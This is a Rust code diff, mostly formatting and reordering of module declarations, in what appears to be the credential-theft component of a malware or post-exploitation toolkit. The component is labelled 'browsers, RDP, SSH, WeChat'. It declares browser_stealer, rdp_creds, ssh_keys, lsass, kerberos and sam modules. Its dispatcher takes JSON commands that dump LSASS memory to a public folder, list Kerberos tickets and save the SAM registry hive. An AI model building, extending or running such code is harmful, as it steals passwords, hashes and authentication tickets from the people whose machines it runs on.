@@ -1,16 +1,16 @@
-//! Credentials cloud module 鈥?browsers, RDP, SSH, WeChat.
+//! Credentials cloud module — browsers, RDP, SSH, WeChat.
 #![allow(non_snake_case)]
 #![allow(clippy::upper_case_acronyms)]
 
 mod browser_stealer;
+mod other_software;
 mod rdp_creds;
 mod ssh_keys;
-mod other_software;
 // lsass/kerberos 依赖 Windows 专属 FFI（browser_ffi/LSA），非 Windows 不编译。
 #[cfg(target_os = "windows")]
-mod lsass;
-#[cfg(target_os = "windows")]
 mod kerberos;
+#[cfg(target_os = "windows")]
+mod lsass;
 mod sam;
 
 use serde_json::Value;
@@ -59,14 +59,16 @@ fn dispatch(input: &str) -> String {
         "lsass" => {
             #[cfg(target_os = "windows")]
             {
-                let path = v.get("path")
+                let path = v
+                    .get("path")
                     .and_then(|p| p.as_str())
                     .unwrap_or("C:\\Users\\Public\\lsass.dmp");
                 return lsass::dump_lsass(path);
             }
             #[cfg(not(target_os = "windows"))]
             {
-                r#"{"success":false,"error":"lsass dump not supported on this platform"}"#.to_string()
+                r#"{"success":false,"error":"lsass dump not supported on this platform"}"#
+                    .to_string()
             }
         }
         "klist" => {
@@ -76,11 +78,13 @@ fn dispatch(input: &str) -> String {
             }
             #[cfg(not(target_os = "windows"))]
             {
-                r#"{"success":false,"error":"kerberos klist not supported on this platform"}"#.to_string()
+                r#"{"success":false,"error":"kerberos klist not supported on this platform"}"#
+                    .to_string()
             }
         }
         "sam" => {
-            let dir = v.get("dir")
+            let dir = v
+                .get("dir")
                 .and_then(|p| p.as_str())
                 .unwrap_or("C:\\Users\\Public");
             sam::save_sam(dir)
@@ -93,7 +97,9 @@ fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
     let bytes = s.as_bytes();
     let n = bytes.len().min(output_cap);
     if n > 0 && !output.is_null() {
-        unsafe { std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n); }
+        unsafe {
+            std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n);
+        }
     }
     n
 }
